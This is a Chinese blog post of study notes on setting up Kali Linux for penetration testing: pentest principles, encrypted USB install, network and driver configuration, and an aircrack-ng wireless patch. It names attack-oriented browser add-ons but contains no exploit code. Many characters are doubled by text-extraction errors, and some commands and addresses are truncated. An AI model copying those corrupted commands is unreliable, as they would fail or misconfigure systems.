<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>安全牛整理笔记 | 学松的小毛驴</title><meta name="keywords" content="网络安全,笔记,kali"><meta name="author" content="张学松"><meta name="copyright" content="张学松"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第一章 介绍Kali linux渗透测试安全问题的根源 分层思想的优劣  只追求功能实现  最⼤大的安全威胁是⼈人   安全目标• 先于攻击者发现和防⽌止漏洞出现 攻击型安全 防护型安全  渗透测试• 尝试挫败安全防御机制，发现系统安全弱点；• 从攻击者的⾓角度思考，测量安全防护有效性；• 证明安全问题的存在，⽽而⾮非破坏； 道德约束 法律  渗透测试标准 PETS（http:&#x2F;&#x2F;www.pent">
<meta property="og:type" content="article">
<meta property="og:title" content="安全牛整理笔记">
<meta property="og:url" content="https://zhangxuesong123.github.io/2022/04/07/%E5%AE%89%E5%85%A8%E7%89%9B%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="学松的小毛驴">
<meta property="og:description" content="第一章 介绍Kali linux渗透测试安全问题的根源 分层思想的优劣  只追求功能实现  最⼤大的安全威胁是⼈人   安全目标• 先于攻击者发现和防⽌止漏洞出现 攻击型安全 防护型安全  渗透测试• 尝试挫败安全防御机制，发现系统安全弱点；• 从攻击者的⾓角度思考，测量安全防护有效性；• 证明安全问题的存在，⽽而⾮非破坏； 道德约束 法律  渗透测试标准 PETS（http:&#x2F;&#x2F;www.pent">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200822171906778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbmFycm93,size_16,color_FFFFFF,t_70#pic_center">
<meta property="article:published_time" content="2022-04-07T03:15:45.000Z">
<meta property="article:modified_time" content="2022-04-08T07:52:49.428Z">
<meta property="article:author" content="张学松">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="kali">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200822171906778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbmFycm93,size_16,color_FFFFFF,t_70#pic_center"><link rel="shortcut icon" href="/img/zxs.png"><link rel="canonical" href="https://zhangxuesong123.github.io/2022/04/07/%E5%AE%89%E5%85%A8%E7%89%9B%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: 张学松","link":"链接: ","source":"来源: 学松的小毛驴","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '安全牛整理笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-08 15:52:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img.xintp.com/c2022/03/10/tw4v0hz1seh.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-align-justify"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/python%E8%87%AA%E5%8A%A8%E5%8C%96/"><i class="fa-fw fa-brands fa-python"></i><span> python自动化</span></a></li><li><a class="site-page child" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="fa-fw fa-solid fa-shield"></i><span> 网络安全</span></a></li><li><a class="site-page child" href="/categories/%E4%B8%93%E5%8D%87%E6%9C%AC/"><i class="fa-fw fa-solid fa-book-bookmark"></i><span> 专升本</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img-blog.csdnimg.cn/20200822171906778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbmFycm93,size_16,color_FFFFFF,t_70#pic_center')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">学松的小毛驴</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-align-justify"></i><span> 分类</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/python%E8%87%AA%E5%8A%A8%E5%8C%96/"><i class="fa-fw fa-brands fa-python"></i><span> python自动化</span></a></li><li><a class="site-page child" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><i class="fa-fw fa-solid fa-shield"></i><span> 网络安全</span></a></li><li><a class="site-page child" href="/categories/%E4%B8%93%E5%8D%87%E6%9C%AC/"><i class="fa-fw fa-solid fa-book-bookmark"></i><span> 专升本</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">安全牛整理笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-07T03:15:45.000Z" title="发表于 2022-04-07 11:15:45">2022-04-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-08T07:52:49.428Z" title="更新于 2022-04-08 15:52:49">2022-04-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>54分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="安全牛整理笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="第一章-介绍"><a href="#第一章-介绍" class="headerlink" title="第一章 介绍"></a>第一章 介绍</h1><h2 id="Kali-linux渗透测试"><a href="#Kali-linux渗透测试" class="headerlink" title="Kali linux渗透测试"></a>Kali linux渗透测试</h2><h4 id="安全问题的根源"><a href="#安全问题的根源" class="headerlink" title="安全问题的根源"></a>安全问题的根源</h4><ul>
<li><p>分层思想的优劣</p>
</li>
<li><p>只追求功能实现</p>
</li>
<li><p>最⼤大的安全威胁是⼈人</p>
</li>
</ul>
<h4 id="安全目标"><a href="#安全目标" class="headerlink" title="安全目标"></a>安全目标</h4><h5 id="•-先于攻击者发现和防⽌止漏洞出现"><a href="#•-先于攻击者发现和防⽌止漏洞出现" class="headerlink" title="• 先于攻击者发现和防⽌止漏洞出现"></a>• 先于攻击者发现和防⽌止漏洞出现</h5><ul>
<li>攻击型安全</li>
<li>防护型安全</li>
</ul>
<h4 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h4><h5 id="•-尝试挫败安全防御机制，发现系统安全弱点；"><a href="#•-尝试挫败安全防御机制，发现系统安全弱点；" class="headerlink" title="• 尝试挫败安全防御机制，发现系统安全弱点；"></a>• 尝试挫败安全防御机制，发现系统安全弱点；</h5><h5 id="•-从攻击者的⾓角度思考，测量安全防护有效性；"><a href="#•-从攻击者的⾓角度思考，测量安全防护有效性；" class="headerlink" title="• 从攻击者的⾓角度思考，测量安全防护有效性；"></a>• 从攻击者的⾓角度思考，测量安全防护有效性；</h5><h5 id="•-证明安全问题的存在，⽽而⾮非破坏；"><a href="#•-证明安全问题的存在，⽽而⾮非破坏；" class="headerlink" title="• 证明安全问题的存在，⽽而⾮非破坏；"></a>• 证明安全问题的存在，⽽而⾮非破坏；</h5><ul>
<li>道德约束</li>
<li>法律</li>
</ul>
<h4 id="渗透测试标准"><a href="#渗透测试标准" class="headerlink" title="渗透测试标准"></a>渗透测试标准</h4><ul>
<li>PETS（<a target="_blank" rel="noopener" href="http://www.pentest-standard.org)/">http://www.pentest-standard.org）</a></li>
<li>前期交互阶段</li>
<li>情报收集阶段</li>
<li>威胁建模阶段</li>
<li>漏洞分析阶段</li>
<li>渗透攻击阶段</li>
<li>后渗透测试阶段</li>
<li>渗透测试报告</li>
</ul>
<h4 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h4><ul>
<li>渗透测试范围</li>
<li>获得授权</li>
<li>渗透测试⽅方法<ul>
<li>是否允许社会⼯工程学</li>
<li>是否允许拒绝服务攻击</li>
</ul>
</li>
</ul>
<h4 id="渗透测试误区"><a href="#渗透测试误区" class="headerlink" title="渗透测试误区"></a>渗透测试误区</h4><ul>
<li>扫描器就是⼀一切<ul>
<li>忽视业务逻辑重的漏洞</li>
</ul>
</li>
</ul>
<h4 id="KALI"><a href="#KALI" class="headerlink" title="KALI"></a>KALI</h4><ul>
<li>Kali（kālī，⾳音译为迦梨或迦利，字⾯面意思是“⿊黑⾊色的”）是印度教中⼀一个重<br>  要的⼥女神，她是湿婆神妃帕尔⽡瓦蒂产⽣生的化⾝身，印度神话中最为⿊黑暗和暴<br>  虐的⿊黑⾊色地⺟母。她⽪皮肤黝⿊黑，⻘青⾯面獠⽛牙，额头和湿婆神⼀一样有第三只眼睛，<br>  四只⼿手臂分持武器，戴着蛇和骷髅的项链，⾆舌头上滴着⾎血。有她的传说总<br>  是与杀戮和鲜⾎血相连，史上曾经⽤用过活⼈人献祭，是印度教派中最为隐晦和<br>  神秘的⼀一派。</li>
<li>迦梨⼀一词也可解释为时间，故中⽂文翻译为时⺟母。在后期的信仰体系中，时<br>  ⺟母被认为与时间和变化有关，象征着强⼤大和新⽣生。</li>
<li>在⾯面对前所未有的强⼤大的阿修罗时陷⼊入困境，这时候她的⾯面孔因为愤怒⽽而<br>  发⿊黑，从她脸上的⿊黑⽓气中诞⽣生了可怕的迦梨。今⽇日印度的都市加尔各答，<br>  名字的意思就是“迦梨的沐浴场”。</li>
</ul>
<h4 id="KALI-LINUX-介绍"><a href="#KALI-LINUX-介绍" class="headerlink" title="KALI LINUX 介绍"></a>KALI LINUX 介绍</h4><ul>
<li>基于Debian的Linux发⾏行版本</li>
<li>前⾝身是BackTrack， 2013 年 3 ⽉月发布；</li>
<li>⽤用于渗透测试和安全审计；</li>
<li>包含600+安全⼯工具</li>
<li>FHS标准⺫⽬目录结构</li>
<li>定制内核</li>
<li>⽀支持ARM和⼿手机平台</li>
<li>开源免费</li>
</ul>
<h4 id="KALI-LINUX-策略"><a href="#KALI-LINUX-策略" class="headerlink" title="KALI LINUX 策略"></a>KALI LINUX 策略</h4><ul>
<li>Root⽤用户策略</li>
<li>⺴⽹网络服务策略</li>
<li>更新升级策略</li>
</ul>
<h4 id="关于本教程"><a href="#关于本教程" class="headerlink" title="关于本教程"></a>关于本教程</h4><ul>
<li>这是⼀一⻔门关于渗透测试⽅方法的课程</li>
<li>这是⼀一⻔门关于kali linix基本使⽤用的教程</li>
<li>不要停留在了解的程度</li>
<li>实践再实践是最好的⽼老师</li>
<li>这⾥里只是起跑线⽽而不是终点线</li>
<li>Kali很强⼤大，但不是全部</li>
</ul>
<h1 id="第二章-安装"><a href="#第二章-安装" class="headerlink" title="第二章 安装"></a>第二章 安装</h1><h2 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h2><ul>
<li>下载安装镜像<ul>
<li><a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></li>
</ul>
</li>
<li>验证hash值</li>
<li>制作启动光盘</li>
<li>制作启动U盘</li>
<li>设置BIOS启动顺序</li>
<li>启动安装</li>
</ul>
<h2 id="持久加密-USB-安装-1"><a href="#持久加密-USB-安装-1" class="headerlink" title="持久加密 USB 安装 -1"></a>持久加密 USB 安装 -1</h2><ul>
<li>LUKS：Linux Unified Key Setup<ul>
<li>磁盘分区加密规范</li>
<li>不依赖于操作系统的磁盘级加密</li>
<li>Windows——DoxBox</li>
<li>后端：dm-crypt</li>
<li>前段：cryptsetup</li>
<li>微软的bitlocker</li>
</ul>
</li>
<li>将镜像刻录到U盘<ul>
<li>dd if&#x3D;kali-linux-1.1.0-amd64.iso of&#x3D;&#x2F;dev&#x2F;sdb bs&#x3D;1M</li>
</ul>
</li>
</ul>
<h2 id="持久加密-USB-安装-2"><a href="#持久加密-USB-安装-2" class="headerlink" title="持久加密 USB 安装 -2"></a>持久加密 USB 安装 -2</h2><ul>
<li><p>为U盘创建额外分区</p>
</li>
<li><p>使⽤用LUKS加密分区</p>
</li>
<li><p>打开加密分区</p>
</li>
<li><p>格式化加密分区+卷标</p>
</li>
<li><p>挂载加密分区，并创建persistence.conf ⽂文件</p>
</li>
<li><p>持久加密 USB 安装 -2</p>
</li>
</ul>
<h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><ul>
<li>官⽅方VM镜像<ul>
<li><a target="_blank" rel="noopener" href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/">https://www.offensive-security.com/kali-linux-vmware-arm-image-download/</a></li>
</ul>
</li>
<li>vmware workstation</li>
<li>VirtualBox<ul>
<li>下载、安装、扩展⼯工具、基本使⽤用</li>
<li>Win8系统(kb3045999)</li>
<li>安装kali</li>
<li>安装tools</li>
</ul>
</li>
</ul>
<h2 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h2><h3 id="•-登陆密码"><a href="#•-登陆密码" class="headerlink" title="• 登陆密码"></a>• 登陆密码</h3><ul>
<li>Top 10 安全⼯工具</li>
<li>字体调整</li>
<li>强⾏行终⽌止程序</li>
<li>文件目录</li>
<li>共享⽂文件</li>
</ul>
<h2 id="熟悉-BASH-命令"><a href="#熟悉-BASH-命令" class="headerlink" title="熟悉 BASH 命令"></a>熟悉 BASH 命令</h2><ul>
<li>Ls、cd、cat、more、tail、cp、rm、top、ps、grep、ifconfig、<br>  netstat、awk、sort、 fdisk、mount、dmesg 、find、whereis、<br>  Echo、vi</li>
<li>管道</li>
<li>Shell 脚本</li>
</ul>
<h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h1><h1 id="第三章-定制"><a href="#第三章-定制" class="headerlink" title="第三章 定制"></a>第三章 定制</h1><h2 id="网络配置-1"><a href="#网络配置-1" class="headerlink" title="网络配置 -1"></a>网络配置 -1</h2><ul>
<li>临时IP地址<ul>
<li>dhclient eth</li>
<li>ifconfig eth0 192.168.1.11&#x2F;24</li>
<li>route add default gw 192.168.1.1</li>
<li>echo nameserver 192.168.1.1 &gt; &#x2F;etc&#x2F;resolv.conf</li>
</ul>
</li>
</ul>
<h2 id="网络配置-2"><a href="#网络配置-2" class="headerlink" title="网络配置 -2"></a>网络配置 -2</h2><h2 id="•-固定IP地址"><a href="#•-固定IP地址" class="headerlink" title="• 固定IP地址"></a>• 固定IP地址</h2><p>• cat &#x2F;etc&#x2F;network&#x2F;interface<br>• auto eth0<br>• iface eth0 inet static<br>• address 192.168.20.1<br>• netmask 255.255.255.0<br>• network 192.168.20.0<br>• broadcast 192.168.20.255<br>• gateway 192.168.20.2<br>• dns-nameservers 192.168.1.1 192.168.1.2<br>• up route add -net 172.16.5.0&#x2F;24 gw 192.168.10.100 eth1<br>• down route del -net 172.24.0.0&#x2F;24</p>
<ul>
<li>⺴⽹网络配置 -<br>- • auto eth • cat &#x2F;etc&#x2F;network&#x2F;interface<br>- • address 192.168.20. • iface eth0 inet static<br>- • netmask 255.255.255.<br>- • network 192.168.20.<br>- • broadcast 192.168.20.<br>- • gateway 192.168.20.<br>- • dns-nameservers 192.168.1.1 192.168.1.<ul>
<li>• up route add -net 172.16.5.0&#x2F;24 gw 192.168.10.100 eth</li>
<li>• down route del -net 172.24.0.0&#x2F;</li>
</ul>
</li>
</ul>
<h2 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h2><ul>
<li>apt-get update</li>
<li>apt-get upgrade</li>
<li>apt-get dis-upgrade</li>
<li>重复执⾏行</li>
</ul>
<h2 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h2><ul>
<li>库<ul>
<li>Apt-get命令</li>
</ul>
</li>
<li>安装适合⾃自⼰己的⼯工具软件<ul>
<li>apt-get install kali-linux-all smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule<br> qbittorrent geany meld stardict ttf-wqy-microhei kchmviewer resolvconf python-dev<br> python-greenlet python-gevent python-vte python-openssl python-crypto python-<br> appindicator python-pip libnss3-tools freemind netspeed libncurses5-dev mtr filezilla filezilla-<br> common chromium monodevelop mono-gmcs -y</li>
</ul>
</li>
</ul>
<h2 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h2><ul>
<li>firefox浏览器插件<ul>
<li>flashgot 、autoproxy 、Tamper Data 、cookie importer、Cookies Manager、User Agent<br> Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、<br> Flagfox、hashr</li>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></li>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss</a></li>
</ul>
</li>
</ul>
<h2 id="•-安装JAVA"><a href="#•-安装JAVA" class="headerlink" title="• 安装JAVA-"></a>• 安装JAVA-</h2><ul>
<li>下载<ul>
<li><a target="_blank" rel="noopener" href="http://java.sun.com/javase/downloads/index.jsp]">http://java.sun.com/javase/downloads/index.jsp]</a>(<a target="_blank" rel="noopener" href="http://java.sun.com/javase/downloads/index.jsp">http://java.sun.com/javase/downloads/index.jsp</a></li>
</ul>
</li>
<li>解包拷⻉贝<ul>
<li>tar -xzvf &#x2F;root&#x2F;jdk-7u45-linux-x64.tar.gz</li>
<li>mv jdk1.7.0_45 &#x2F;opt</li>
<li>cd &#x2F;opt&#x2F;jdk1.7.0_</li>
</ul>
</li>
<li>安装注册<ul>
<li>update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;opt&#x2F;jdk1.7.0_45&#x2F;bin&#x2F;java 1</li>
<li>update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;opt&#x2F;jdk1.7.0_45&#x2F;bin&#x2F;javac 1</li>
<li>update-alternatives –install &#x2F;usr&#x2F;lib&#x2F;mozilla&#x2F;plugins&#x2F;libjavaplugin.so mozilla-javaplugin.so &#x2F;<br> opt&#x2F;jdk1.7.0_45&#x2F;jre&#x2F;lib&#x2F;amd64&#x2F;libnpjp2.so 1</li>
</ul>
</li>
</ul>
<h2 id="•-安装JAVA-1"><a href="#•-安装JAVA-1" class="headerlink" title="• 安装JAVA-"></a>• 安装JAVA-</h2><ul>
<li>默认设置<ul>
<li>update-alternatives –set java &#x2F;opt&#x2F;jdk1.7.0_45&#x2F;bin&#x2F;java</li>
<li>update-alternatives –set javac &#x2F;opt&#x2F;jdk1.7.0_45&#x2F;bin&#x2F;javac</li>
<li>update-alternatives –set mozilla-javaplugin.so &#x2F;opt&#x2F;jdk1.7.0_45&#x2F;jre&#x2F;lib&#x2F;amd64&#x2F;libnpjp2.so</li>
</ul>
</li>
<li>验证<ul>
<li>java –version</li>
<li><a target="_blank" rel="noopener" href="http://www.java.com/en/download/installed.jsp">http://www.java.com/en/download/installed.jsp</a></li>
</ul>
</li>
</ul>
<h2 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h2><ul>
<li>GPU的⽤用途<ul>
<li>Nvidia</li>
<li>Ati</li>
</ul>
</li>
<li>Nvidia显卡驱动安装<ul>
<li>apt-get update<br> apt-get dist-upgrade<br> apt-get install -y linux-headers-$(uname -r)<br> apt-get install nvidia-kernel-dkms</li>
<li>sed ‘s&#x2F;quiet&#x2F;quiet nouveau.modeset&#x3D;0&#x2F;g’ -i &#x2F;etc&#x2F;default&#x2F;grub<br> update-grub<br> reboot</li>
</ul>
</li>
<li>验证：<ul>
<li>glxinfo | grep -i “direct rendering“<ul>
<li><em>direct rendering: Yes</em></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="无线网卡补丁"><a href="#无线网卡补丁" class="headerlink" title="无线网卡补丁"></a>无线网卡补丁</h2><ul>
<li>最新版内核已经集成⽆无线驱动补丁</li>
<li>如果你在使⽤用⽼老版本内核<ul>
<li>cd &#x2F;usr&#x2F;src&#x2F;</li>
<li>wget <a target="_blank" rel="noopener" href="https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-">https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-</a> <strong>3.12</strong> -1.tar.bz</li>
<li>tar xvf backports-3.12-1.tar.bz</li>
<li>cd backports-3.12-</li>
<li>apt-get install patch</li>
<li>wget <a target="_blank" rel="noopener" href="http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch">http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch</a></li>
<li>patch -p1 &lt; mac80211.compat08082009.wl_frag+ack_v1.patch</li>
<li>apt-get install libncurses5-dev</li>
<li>airmon-ng （查看驱动）</li>
<li>make defconfig-ath9k</li>
<li>make &amp;&amp; make install</li>
</ul>
</li>
</ul>
<h2 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h2><ul>
<li>Ulimite⽤用于限制当前 shell 内进程的资源使⽤用</li>
<li>查看默认值<ul>
<li>Ulimite –a</li>
</ul>
</li>
<li>全局配置⽂文件 ：&#x2F;etc&#x2F;security&#x2F;limits<ul>
<li><domain> <type> <item> <value></li>
</ul>
</li>
<li>⽤用途距离<ul>
<li>限制⽂文件块⼤大⼩小：ulimit – s 100</li>
<li>限制shell内存使⽤用：ulimit -m 5000 -v 5000</li>
</ul>
</li>
<li>没有直接对socket数量的限制参数<ul>
<li>Linux系统中⼀一切都是⽂文件，运⾏行中的⽂文件叫做进程</li>
<li>ulimite –n 800000</li>
</ul>
</li>
</ul>
<h2 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h2><ul>
<li>渗透测试系统耗电较⼤大</li>
<li>延⻓长电池寿命<ul>
<li>⽆无操作挂起、关闭显⽰示器</li>
<li>降低显⽰示器亮度</li>
<li>不使⽤用时关闭⽆无线⺴⽹网卡</li>
<li>开启硬盘省电选项<ul>
<li>hdparm -i &#x2F;dev&#x2F;sda if AdvancedPM&#x3D;yes then hdparm -B 1 -S 12 &#x2F;dev&#x2F;<br> sda</li>
</ul>
</li>
<li>启动笔记本模式</li>
</ul>
</li>
</ul>
<h2 id="笔记本模式"><a href="#笔记本模式" class="headerlink" title="笔记本模式"></a>笔记本模式</h2><ul>
<li>#!&#x2F;bin&#x2F;bash</li>
</ul>
